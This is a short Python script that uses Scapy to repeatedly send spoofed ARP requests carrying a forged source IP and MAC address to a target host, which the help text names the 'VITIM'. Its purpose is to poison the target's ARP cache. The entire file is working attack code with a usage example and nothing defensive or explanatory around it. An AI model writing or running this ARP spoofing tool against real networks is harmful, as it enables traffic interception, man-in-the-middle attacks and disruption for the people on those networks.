#Usage: python arp.py --dstip 192.168.220.254 --srcip 192.168.220.1 --srcmac 11:22:33:44:55:66
#
from scapy.all import *
import time
import argparse
import os
import sys

def sendARP(args):
  a=ARP()
  a.pdst = args.dstip
  a.psrc = args.srcip
  a.hwsrc = args.srcmac
  a.op = 'who-has'
  try:
    while 1:
      send(a, 1)
      time.sleep(5)
  except KeyboardInterrupt:
    pass  

parser = argparse.ArgumentParser()
parser.add_argument('--dstip', required=True, help="IP to send the ARP (VITIM)")
parser.add_argument('--srcip', required=True, help="Source IP address of the ARP packet (IP to be added)")
parser.add_argument('--srcmac', required=True, help="SRC MAC address of the ARP packet (MAC to be added")

args = parser.parse_args()

sendARP(args)
